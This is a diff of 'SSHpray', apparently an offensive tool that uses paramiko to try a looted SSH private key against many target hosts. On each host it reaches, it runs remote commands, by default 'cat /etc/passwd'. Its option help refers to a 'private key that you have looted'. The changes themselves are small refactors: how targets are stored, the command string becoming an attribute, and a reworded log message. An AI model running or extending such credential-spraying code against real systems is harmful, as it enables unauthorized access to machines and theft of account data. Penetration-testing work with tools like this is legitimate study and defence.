@@ -41,7 +41,7 @@ class SSHpray():
 			self.targetsFile = self.args.targets
 			self.read_targets()
 		else:
-			self.targetSet = self.args.ipaddress
+			self.targetSet.add(''.join(self.args.ipaddress))
 
 
 		if self.args.username is None:
@@ -141,13 +141,13 @@ class SSHpray():
 
 		for i, t in enumerate(self.targetSet):
 
-			#command(s) to run
-			remote_commands = '''
+			#command(s) to run, add more one per line and end with a semicolon
+			self.remote_commands = '''
 			cat /etc/passwd;
 			exit
 			'''
 
-			if self.args.verbose is True: print ("[+] Hitting SSH on %s to run commands" % (t) )
+			if self.args.verbose is True: print ("[+] Attempting to SSH to %s" % (t) )
 
 			try:#Initialize SSH session to host via paramiko and run the command contents
 				ssh = paramiko.SSHClient()
@@ -156,7 +156,7 @@ class SSHpray():
 
 				ssh.connect(t, username = self.args.username, key_filename = self.args.keyfile, timeout=5)
 
-				stdin, stdout, stderr = ssh.exec_command(str(remote_commands))
+				stdin, stdout, stderr = ssh.exec_command(str(self.remote_commands))
 				
 				#server response not working for some reason
 				print ("[+] Server responded with: \n")
@@ -179,6 +179,7 @@ def main():
 
 	#gather options
 	parser = argparse.ArgumentParser()
+
 
 	parser.add_argument('-i', '--ipaddress', metavar='127.0.0.1', help='single ip to test')
 	parser.add_argument('-k', '--keyfile', metavar='<keyfile>', help='private key that you have looted')
